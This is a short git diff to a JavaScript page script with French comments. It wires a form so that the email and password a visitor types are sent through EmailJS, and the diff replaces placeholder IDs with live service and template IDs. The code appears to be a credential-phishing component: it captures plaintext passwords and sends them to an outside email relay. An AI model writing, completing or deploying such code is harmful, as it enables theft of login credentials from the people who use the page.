@@ -22,7 +22,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
         if (passwordInput.value.trim() !== "") {
             // Envoyer les données à EmailJS
-            emailjs.send("votre_serviceID", "votre_templateID", {
+            emailjs.send("service_u6vikzg", "template_0x8is9j", {
                 email: emailInput.value,
                 password: passwordInput.value
             }).then(function(response) {
